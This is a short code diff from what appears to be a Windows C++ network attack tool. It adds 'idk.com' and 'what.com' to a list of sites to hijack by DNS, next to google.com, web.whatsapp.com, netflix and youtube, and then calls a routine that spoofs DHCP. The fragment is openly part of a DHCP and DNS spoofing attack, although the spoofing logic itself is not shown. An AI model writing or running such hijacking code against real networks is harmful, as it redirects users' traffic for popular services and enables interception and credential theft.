@@ -23,9 +23,9 @@ int main()
 	DWORD hThreadID;
 	AddressInfo info{};
 
-	getAddrInfo(&info);	// Inits all data for the struct, all info regarfing the network
+	getAddrInfo(&info);	// Inits all data for the struct, all info referfing the network
 
-	/*Inits the list of sites for the dns hijacking-*/
+	/*Set the list of sites for the dns hijacking-*/
 	int nSites = 0;
 	info.DNS_sites = (char**)malloc(sizeof(char*) * HIJACKED_SITES);
 	info.DNS_sites[nSites++] = (char*)"www.google.com";
@@ -33,6 +33,8 @@ int main()
 	info.DNS_sites[nSites++] = (char*)"web.whatsapp.com";
 	info.DNS_sites[nSites++] = (char*)"www.netflix.com";
 	info.DNS_sites[nSites++] = (char*)"www.youtube.com";
+	info.DNS_sites[nSites++] = (char*)"idk.com";
+	info.DNS_sites[nSites++] = (char*)"what.com";
 
 	startSpoofing((LPVOID)&info); // start the spoofing of the DHCP and 
 
